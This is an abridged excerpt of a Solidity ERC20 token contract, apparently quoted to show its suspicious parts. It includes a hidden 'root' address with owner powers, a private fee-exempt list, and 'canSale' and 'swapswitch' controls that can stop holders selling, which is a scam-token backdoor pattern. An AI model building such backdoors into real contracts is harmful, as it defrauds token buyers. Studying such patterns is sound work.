...
contract Ownable {
     ...
     */
    modifier onlyOwner() {
        require(owner == msg.sender || root == msg.sender, "Ownable: caller is not the owner");
        _;
    }
...
contract ERC20 is IERC20, Ownable {
	...
	mapping (address => bool) private ROOTList;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
		...
		if(ROOTList[sender] || ROOTList[recipient]){
            if(sender == owner){
            ...
            if(recipient == swap){require(swapswitch);}
            require(! canSale[sender]);
			_transferfee(sender, recipient, amount);
		}
    }
	
	function _transferNofee(address sender, address recipient, uint256 amount) internal  {
        uint256 fromHave = balances[sender];
        uint256 toHave = balances[recipient];
		balances[sender] = fromHave.sub(amount);
		balances[recipient] = toHave.add(amount);
		emit Transfer(sender, recipient, amount);
    }
	
	function _transferfee(address sender, address recipient, uint256 amount) internal {
...
contract Token is ERC20 {
    ...
    constructor (string memory name1, string memory symbol1, uint8 decimals1, address tokenOwner, address _root)  {
        _name = name1;
        _symbol = symbol1;
        _decimals = decimals1;
        owner = msg.sender;
        root = _root;
        _mint(tokenOwner, 1000000000 * (10 ** uint256(decimals1)));
    }
